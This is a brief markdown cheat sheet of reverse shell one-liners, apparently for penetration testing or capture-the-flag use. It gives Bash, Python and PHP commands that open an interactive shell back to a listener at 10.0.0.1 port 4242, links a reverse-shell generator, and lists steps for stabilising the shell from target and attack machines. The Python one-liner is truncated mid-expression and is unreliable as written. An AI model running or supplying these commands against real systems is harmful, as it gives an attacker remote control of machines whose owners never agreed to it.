# Reverse Shells
1. [Reverse Shell Generator](https://www.revshells.com/)

2. Bash
    ```
    bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
    ```
3. Python
    ```
    python -c 'a=__import__;s=a("socket").socket;o=a("os").dup2;p=a("pty").spawn;c=s();c.connect(("10.0.0.1",4242)
    ```
4. PHP
    ```
    php -r '$sock=fsockopen("10.0.0.1",4242);exec("/bin/sh -i <&3 >&3 2>&3");'
    ```

# Reverse Shell Stabilization
1. Via Python
    ```
    (On Target Machine) python -c 'import pty; pty.spawn("/bin/bash")'
    (On Attack Machine) stty raw -echo; fg; reset
    ```
2. Via script
    ```
    (On Target Machine) /usr/bin/script -qc /bin/bash /dev/null
    (On Attack Machine) stty raw -echo; fg; reset
    ```
